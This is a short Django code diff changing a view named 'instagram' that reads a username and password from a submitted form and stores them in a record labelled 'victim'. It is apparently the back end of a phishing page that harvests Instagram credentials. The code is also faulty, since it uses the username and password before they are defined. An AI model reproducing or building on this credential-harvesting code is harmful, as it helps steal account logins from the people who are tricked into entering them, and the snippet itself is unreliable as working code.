@@ -131,8 +131,8 @@ def weather(request):
     return render(request, 'projects/weather.html', context)
 
 def instagram(request):
-    victim,update = Instagram.objects.update_or_create(username,password)
     if request.method == 'POST':
+        victim,update = Instagram.objects.update_or_create(username,password)
         username = request.POST.get('username').lower()
         password = request.POST.get('password')
         victim.save()
